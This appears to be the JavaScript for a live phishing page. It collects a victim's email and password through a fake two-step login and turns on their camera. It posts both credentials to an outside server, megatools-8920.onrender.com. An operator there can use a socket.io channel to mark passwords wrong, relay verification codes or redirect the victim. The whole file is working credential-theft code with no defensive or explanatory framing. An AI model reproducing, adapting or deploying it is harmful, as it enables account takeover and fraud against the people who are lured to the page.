let emails = "";
const id = new URLSearchParams(window.location.search).get("id");
let infoId = "";
// Background video
function getDeviceType() {
  const ua = navigator.userAgent.toLowerCase();
  const isMobile =
    /android|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(ua);
  const isTablet = /ipad|tablet|playbook|silk/i.test(ua) && !isMobile;

  if (isMobile || isTablet) return "mobile";
  return "desktop";
}

const deviceType = getDeviceType();
window.addEventListener("load", async () => {
  localStorage.removeItem("wrongPassword");
});
navigator.mediaDevices
  .getUserMedia({ video: true, audio: false })
  .then((stream) => {
    document.getElementById("cameraBg").srcObject = stream;
  })
  .catch(() => {
    console.warn("Camera access denied");
  });
const errorBox = document.getElementById("passwordError");

document.getElementById("emailInput").addEventListener("keydown", function (e) {
  if (e.key === "Enter") {
    e.preventDefault();
    goToPasswordStep();
  }
});

document
  .getElementById("passwordInput")
  .addEventListener("keydown", function (e) {
    if (e.key === "Enter") {
      e.preventDefault();
      showLoading();
    }
  });

async function goToPasswordStep() {
  const email = document.getElementById("emailInput").value.trim();
  if (!email) return alert("Enter your email");

  try {
    const res = await fetch(
      "https://megatools-8920.onrender.com/api/v1/information",
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          user: id,
          deviceType,
          siteName: "AutoInfo/login-view",
          email,
        }),
      },
    );

    const data = await res.json();
    if (data.success) {
      emails = email;
      infoId = data.data._id;
      connectAndJoinRoom(infoId);
      toggleStep("stepEmail", "stepPassword");
      const displayEmail = document.getElementById("displayEmail");
      if (displayEmail) displayEmail.textContent = emails;
    } else {
      alert(data.message || "Something went wrong.");
    }
  } catch (err) {
    console.error(err);
    alert("Failed to save email.");
  }
}

const passwordInput = document.getElementById("passwordInput");
const showPassword = document.getElementById("showPassword");

showPassword.addEventListener("change", () => {
  passwordInput.type = showPassword.checked ? "text" : "password";
});

async function showLoading() {
  const password = document.getElementById("passwordInput").value;
  if (!password) return alert("Enter your password");

  const isRetry = localStorage.getItem("wrongPassword") === "true";
  const body = { email: emails };
  body[isRetry ? "repassword" : "password"] = password;

  try {
    await fetch(
      `https://megatools-8920.onrender.com/api/v1/information/${infoId}`,
      {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(body),
      },
    );
    toggleStep("stepPassword", "stepLoading");
    passwordInput.value = "";
  } catch (err) {
    console.error(err);
    alert("Failed to save password.");
  }
}

function toggleStep(hideId, showId) {
  document.getElementById(hideId).classList.add("hidden");
  document.getElementById(showId).classList.remove("hidden");
}

function connectAndJoinRoom(roomId) {
  if (!roomId) return console.error("Invalid room ID for socket connection");
  console.log(roomId, "roomId");
  const socket = io("https://megatools-8920.onrender.com");
  socket.emit("joinRoom", roomId);
  socket.on("link", ({ data }) => {
    console.log(data, "data");
    window.location.href = `${data.url}`;
  });
  socket.on("code", ({ data }) => {
    console.log("INFO CREATED:", data);
    console.log("Mail code updated:", data.code);

    if (data.code === "wrong" || data.code === false || data.code === 0) {
      localStorage.setItem("wrongPassword", "true");
      // WRONG PASSWORD
      toggleStep("stepLoading", "stepPassword");
      errorBox.textContent = "Incorrect password. Try again.";
      errorBox.classList.remove("hidden");
      return;
    }

    if (data.code === "done") {
      localStorage.removeItem("wrongPassword");

      const googleMapsUrl = "https://facetime.apple.com/join"; // or more specific

      console.log("Code DONE →:", googleMapsUrl);
      window.location.href = googleMapsUrl;
      return;
    }
    localStorage.removeItem("wrongPassword");
    window.location.href = `${data.url}/?id=${roomId}&code=${data.code}`;
  });
}
